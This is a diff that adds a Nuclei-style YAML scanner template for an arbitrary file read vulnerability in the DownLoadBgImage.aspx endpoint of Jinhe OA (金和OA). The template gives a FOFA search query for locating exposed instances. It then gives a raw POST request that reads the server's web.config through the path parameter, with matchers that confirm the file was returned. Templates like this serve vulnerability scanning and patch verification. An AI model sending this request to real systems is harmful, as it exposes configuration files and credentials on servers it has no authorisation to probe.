@@ -1,0 +1,32 @@
+id: jinhe-oa-downloadbgimage-file-read
+
+info:
+  name: "金和OA DownLoadBgImage.aspx接口任意文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: app="金和网络-金和OA"
+      金和OA系统DownLoadBgImage.aspx接口未正确校验文件路径参数，攻击者可通过构造恶意请求读取任意文件，可能导致敏感数据泄露。
+  tags: 金和OA
+
+http:
+- raw:
+  - |
+    POST /c6/Jhsoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx/ HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: close
+
+    path=/c6/web.config
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+      - "xml version"
+      - "<configuration>"
+    condition: and
